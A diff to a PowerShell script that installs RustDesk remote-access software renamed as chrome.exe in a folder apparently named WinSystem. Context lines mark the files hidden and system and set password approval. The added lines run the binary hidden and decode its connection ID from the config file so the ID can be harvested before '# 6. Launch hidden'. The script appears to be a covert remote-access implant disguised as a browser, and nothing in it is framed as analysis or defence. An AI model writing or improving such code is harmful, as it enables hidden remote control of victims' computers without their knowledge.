@@ -39,24 +39,33 @@ Add-Content "$cfgDir\RustDesk2.toml" "approve-mode = 'password'" -Encoding UTF8
 $f = Get-Item $DEST -Force
 $f.Attributes = $f.Attributes -bor 2 -bor 4
 
-# 5. Get ID before launching
-$idRaw = & "$DEST\chrome.exe" --get-id 2>&1
-$RDID = "$idRaw".Trim()
+# 5. Get ID before launching (with timeout)
+$RDID = ""
+try {
+    $proc = Start-Process "$DEST\chrome.exe" -ArgumentList "--get-id" -PassThru -Wait -WindowStyle Hidden -RedirectStandardOutput "$DEST\id.txt" -EA Stop
+    Start-Sleep 1
+    if(Test-Path "$DEST\id.txt"){ $RDID = (Get-Content "$DEST\id.txt" -Raw).Trim() }
+} catch { }
 
+# If --get-id failed/hung, launch briefly to generate config
 if (!$RDID -or $RDID -notmatch '^\d+$') {
     $psi0 = New-Object System.Diagnostics.ProcessStartInfo
     $psi0.FileName = "$DEST\chrome.exe"; $psi0.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden; $psi0.UseShellExecute = $true
-    [System.Diagnostics.Process]::Start($psi0) | Out-Null
+    $pr = [System.Diagnostics.Process]::Start($psi0)
     Start-Sleep 5
-    Get-Process chrome -EA SilentlyContinue | Where-Object{$_.Path -like "*WinSystem*"} | Stop-Process -Force -EA SilentlyContinue
+    $pr | Stop-Process -Force -EA SilentlyContinue
     Start-Sleep 2
-    $idRaw = & "$DEST\chrome.exe" --get-id 2>&1
-    $RDID = "$idRaw".Trim()
-}
-
-if (!$RDID -or $RDID -notmatch '^\d+$') {
-    $enc = (Get-Content "$cfgDir\RustDesk.toml" | Where-Object{$_ -match "enc_id"}) -replace "enc_id\s*=\s*'","" -replace "'","" -replace "^00",""
-    try { $b=[Convert]::FromBase64String($enc); $RDID=[System.BitConverter]::ToUInt32($b[($b.Length-4)..($b.Length-1)],0).ToString() } catch { $RDID = "Check RustDesk" }
+    # Read ID from enc_id in config
+    $cfg2 = "$env:APPDATA\RustDesk\config\RustDesk.toml"
+    if(Test-Path $cfg2){
+        $enc = (Get-Content $cfg2 | Where-Object{$_ -match "enc_id"}) -replace "enc_id\s*=\s*'","" -replace "'","" -replace "^00",""
+        if($enc){
+            try {
+                $b=[Convert]::FromBase64String($enc)
+                $RDID=[System.BitConverter]::ToUInt32($b[($b.Length-4)..($b.Length-1)],0).ToString()
+            } catch { $RDID="Check app" }
+        }
+    }
 }
 
 # 6. Launch hidden
